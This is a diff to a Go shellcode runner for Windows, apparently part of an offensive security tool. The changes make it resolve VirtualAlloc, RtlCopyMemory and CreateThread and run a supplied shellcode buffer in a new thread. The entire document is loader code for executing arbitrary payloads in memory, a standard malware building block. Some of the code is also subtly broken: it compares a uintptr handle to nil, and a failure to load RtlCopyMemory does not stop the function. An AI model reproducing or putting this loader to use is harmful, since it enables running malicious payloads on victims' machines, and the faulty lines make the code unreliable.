@@ -21,6 +21,7 @@ var (
 	hNtdll         *syscall.DLL
 	fpVirtualAlloc  *syscall.Proc
 	fpRtlCopyMemory *syscall.Proc
+	fpCreateThread  *syscall.Proc
 )
 
 // Runner runner
@@ -33,35 +34,43 @@ func Runner(shellcode []byte) (bool, string) {
 	if checkErrorMessage(err) {
 		return false, execute.ERROR_PID
 	}
-	syscall.Syscall(address, 0, 0, 0, 0)
+
+	// Run shellcode in new thread
+	hThread, _, err := fpCreateThread.Call(0, 0, address, 0, 0, 0)
+	if checkErrorMessage(err) {
+		return false, execute.ERROR_PID
+	}
+	if (hThread == nil) {
+		return false, execute.ERROR_PID
+	}
 	return true, execute.SUCCESS_PID
 }
 
 // IsAvailable does a shellcode runner exist
 func IsAvailable() bool {
-	var kernel32Err error
-	var ntdllErr error
-	var vAllocErr error
-	var rtlCopyMemErr error
-	if hKernel32, kernel32Err = syscall.LoadDLL("kernel32.dll"); kernel32Err == nil {
-		if fpVirtualAlloc, vAllocErr = hKernel32.FindProc("VirtualAlloc"); vAllocErr != nil {
-			fmt.Printf("[-] Failed to load VirtualAlloc API: %s", vAllocErr.Error())
-			return false
-		}
-		if hNtdll, ntdllErr = syscall.LoadDLL("ntdll.dll"); ntdllErr == nil {
-			if fpRtlCopyMemory, rtlCopyMemErr = hNtdll.FindProc("RtlCopyMemory"); rtlCopyMemErr == nil {
-				fmt.Printf("[+] Fetched required APIs for shellcode runner.")
-				return true
-			} else {
-				fmt.Printf("[-] Failed to load RtlCopyMemory API: %s", rtlCopyMemErr.Error())
-			}
-		} else {
-			fmt.Printf("[!] Failed to load NTDLL: %s", ntdllErr.Error())
-		}
-	} else {
-		fmt.Printf("[-] Failed to load Kernel32: %s", kernel32Err.Error())
+	var err error
+	if hKernel32, err = syscall.LoadDLL("kernel32.dll"); err != nil {
+		fmt.Printf("[-] Failed to load Kernel32: %s", err.Error())
+		return false
 	}
-	return false
+	if hNtdll, err = syscall.LoadDLL("ntdll.dll"); err != nil {
+		fmt.Printf("[!] Failed to load NTDLL: %s", err.Error())
+		return false
+	}
+	if fpVirtualAlloc, err = hKernel32.FindProc("VirtualAlloc"); err != nil {
+		fmt.Printf("[-] Failed to load VirtualAlloc API: %s", err.Error())
+		return false
+	}
+	if fpRtlCopyMemory, err = hNtdll.FindProc("RtlCopyMemory"); err != nil {
+		fmt.Printf("[-] Failed to load RtlCopyMemory API: %s", err.Error())
+	}
+	if fpCreateThread, err = hKernel32.FindProc("CreateThread"); err != nil {
+		fmt.Printf("[-] Failed to load CreateThread API: %s", err.Error())
+		return false
+	}
+
+	fmt.Printf("[+] Fetched required APIs for shellcode runner.")
+	return true
 }
 
 // Check for error message
